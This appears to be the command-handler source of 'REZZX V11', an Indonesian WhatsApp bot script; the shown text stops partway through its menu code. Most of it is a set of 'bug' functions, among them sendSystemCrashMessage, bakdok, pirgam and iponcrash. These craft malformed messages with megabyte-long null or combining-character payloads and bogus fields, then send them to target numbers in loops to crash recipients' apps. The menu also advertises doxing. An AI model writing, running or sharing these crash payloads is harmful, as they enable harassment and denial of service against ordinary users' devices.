/*

                                       REZZX V11 SIMPLE MENU 
                                       NEW FITUR : DOX - BUG - ADMIN PANEL - RESELLER PANEL
                                       SCRIPT DIBUAT PADA TANGGAL : 18-8-2024
                                       COLLABORASI DENGAN HYREN 4K

*/

module.exports = async (rezzx, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await rezzx.decodeJid(rezzx.user.id)
const sender = m.key.fromMe ? (rezzx.user.id.split(':')[0]+'@s.whatsapp.net' || rezzx.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await rezzx.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return rezzx.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

        // Days
        const hariini = moment.tz('Asia/Riau').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Rakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Rakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang'
        }
        if (time2 < "17:30:00") {
            var ucapanWaktu = 'Selamat Sore '
        }
        if (time2 < "13:00:00") {
            var ucapanWaktu = 'Selamat Siang'
        }
        if (time2 < "08:00:00") {
            var ucapanWaktu = 'Selamat Pagi'
        }
        if (time2 < "04:50:00") {
            var ucapanWaktu = 'Selamat Subuh'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam'
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const rzvimage = fs.readFileSync('./rzv/rezzv.jpg')
const virgam = fs.readFileSync('./rzv/virgam.png')
const slayer07 = fs.readFileSync('./rzv/slayer07.jpg')
const bugthumb = fs.readFileSync ('./rzv/anu.jpg')

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await rezzx.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await rezzx.getName(i + '@s.whatsapp.net')}\n
FN:${await rezzx.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:rezzx@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://heylink.me/rezzx-website
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await rezzx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
rezzx.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
rezzx.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "M.r-Lazar", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://telegra.ph/file/f2c25fd18ec9c26a6d744.jpg", 
"sourceUrl": "https://lynk.id/szz" }}}, { quoted: m }) }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

// Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rzvimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: ` REZZX VIRUS `
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`+"".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rezzx.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: " REZZ X HYREN4K V11 ",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg" } }, { upload: rezzx.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "�          #REZZ X HYREN4K V11"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌`+"".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rezzx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "VX REZZ X HYREN4K V11" + "\0".repeat(920000),
      'footerText': "REZZ X HYREN4K V11",
      'description': "REZZ X HYREN4K V11",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌'+"".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': "RezzX"
          },
          'body': {
            'text': "REZZ X HYREN4K V11"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'REZZX IN FOR FAMAOUS', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rezzx.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  rezzx.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '_🍀 Not RezzX V11 🍀 Ah Ah Ah_',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '☠️ R⃪᷎᷏ᷚ᷋᷍E⃮⃯Z᷎⃮⃮᷋᷍Z⃖⃖⃖⃖⃖⃧⃧⃩⃡⃕ V⃒⃡⃡⃡⃡⃩⃩⃩⃩⃡⃕⃔⃕⃗IRᷡᷡᷞᷪᷭ᷆᷅᷅᷅᷍᷍U᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷊᷉᷑᷑S᷂᷂᷂᷂᷂᷂᷂᷂᷆ᷚ᷒ᷓ᷉᷉᷍᷍᷍᷍ ☠️ ✨҈͓̙̪͔̞̯̞̥̟͎̯̅͂̂̇ͅs҈̖̟͇̈́͊̇͋͜͡ù̴̢̙̭̖̤̂̀̒̓͡p҈͉͎͓̍̆͢͝e̸͎͖̣̐̋̊͊̕͢r҈̟̫̜̏́͢͡ ę̶̳̙̬̝͑̾͗̽̓͡ź̴̜̳̤̜͊͢͡ͅy̵̟̤̱̔̓̾̔͢͡ c҉̨̞͔̟͇̩́̓́̃̒͞ŗ̷͇̣̝̒͗̍̾͌͝a̷̡̘̯̜͆͒̊̏͠s҈͉̪̯͈̜҇̀͂͜h̷͔̠̘҇̔̍͒͜🔥............ ✅҈͔̩͉̘͇̬̣͓̝̥̦̙͔̀̀̅̋́̃͛͗͐̊̅͊̌' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(1500);
    sendSystemCrashMessage(jid);
    await sleep(1500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(1500);
    sendSystemCrashMessage(jid);
    await sleep(1500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `REZZ X HYREN4K V11`
}
}
}

async function iponcrash(target) {
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rezzx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rezzx.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "NOT VX - REZZ X HYREN4K V11"
    },
    "footer": {
      "text": "�NOT VX - REZZ X HYREN4K V11"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'NOT VX - REZZ X HYREN4K V11', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rezzx.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(1500)
sendExtendedTextMessage(jid)
}

//batas bug

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': ` REZZX V11 MENU SIMPLE `, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/2615d843415604e717885.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
rezzx.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
rezzx.groupParticipantsUpdate(m.chat, [sender], 'remove')
rezzx.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

NAMA BOT : ${namabot}
NOMOR OWNERKU :@${owner.split("@")[0]}
VERSI SCRIPT SAAT INI : V11
RUNTIME : ${runtime(process.uptime())}

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} ${prefix}allmenu
${global.rezz1} ${prefix}resellermenu
${global.rezz1} ${prefix}adpmenu
${global.rezz1} ${prefix}ownermenu
${global.rezz1} ${prefix}doxmenu
${global.rezz1} ${prefix}bugmenu
${global.rezz1} ${prefix}thanksto

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

Script By � Rezz X Hyren4k
Powered by RezzX V11

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`

           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'resellermenu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hai tod  Version Script Ini V11
Dan dibuat Oleh RezzX Collaborasi dengan Hyren4k

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

${global.rezz1} NAMA BOT : ${namabot}
${global.rezz1} NAMA OWNER : ${rezzown}
